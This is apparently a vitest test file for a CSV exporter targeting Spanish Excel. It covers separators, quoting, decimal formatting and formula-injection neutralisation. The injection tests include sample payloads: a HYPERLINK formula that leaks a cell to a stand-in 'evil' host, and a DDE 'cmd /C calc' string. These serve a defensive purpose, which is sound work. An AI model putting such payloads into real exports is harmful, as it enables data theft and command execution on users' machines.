// SPDX-License-Identifier: MIT
import { describe, expect, it } from "vitest";
import { formatNumber, neutralizeFormula, pesos, toCsv } from "./csv";

describe("csv for Excel in Spanish", () => {
  it("uses semicolons, a BOM and CRLF", () => {
    const csv = toCsv(["Nombre", "Kilos"], [["Ana", 12.5]]);
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv).toBe("\uFEFFNombre;Kilos\r\nAna;12,5\r\n");
  });

  it("quotes cells that carry a separator, a quote or a newline", () => {
    const csv = toCsv(["a"], [['El "Alto"; lote 2']]);
    expect(csv).toContain('"El ""Alto""; lote 2"');
  });

  it("leaves unknown values empty instead of writing a zero", () => {
    expect(toCsv(["v"], [[null], [undefined]])).toBe("\uFEFFv\r\n\r\n\r\n");
    expect(pesos(null)).toBeNull();
  });

  it("writes numbers with a decimal comma and no grouping", () => {
    expect(formatNumber(1234567.25)).toBe("1234567,25");
    expect(pesos(123456)).toBe(1235);
  });

  describe("formula injection", () => {
    const one = (v: string | number) => toCsv(["a"], [[v]]).split("\r\n")[1];

    it("prefixes text that a spreadsheet would run as a formula", () => {
      expect(one('=HYPERLINK("http://evil/?x="&A1;"clic")')).toBe(
        `"'=HYPERLINK(""http://evil/?x=""&A1;""clic"")"`,
      );
      expect(one("+1+1")).toBe("'+1+1");
      expect(one("-1+cmd|' /C calc'!A0")).toBe("'-1+cmd|' /C calc'!A0");
      expect(one("@SUM(A1)")).toBe("'@SUM(A1)");
      expect(one("\t=1")).toBe("'\t=1");
      expect(toCsv(["a"], [["\r=1"]])).toBe('﻿a\r\n"\'\r=1"\r\n');
      expect(neutralizeFormula("＝1+1")).toBe("'＝1+1");
    });

    it("keeps numbers numeric", () => {
      expect(one(-5000)).toBe("-5000");
      expect(one(-12.5)).toBe("-12,5");
      expect(one("-5000")).toBe("-5000");
      expect(one("-12,5")).toBe("-12,5");
    });

    it("leaves ordinary names alone and still quotes", () => {
      expect(one("Ana María")).toBe("Ana María");
      expect(one("Lote 3 - norte")).toBe("Lote 3 - norte");
      expect(one("ana@finca.co")).toBe("ana@finca.co");
      expect(one('El "Alto"; lote 2')).toBe('"El ""Alto""; lote 2"');
    });
  });
});
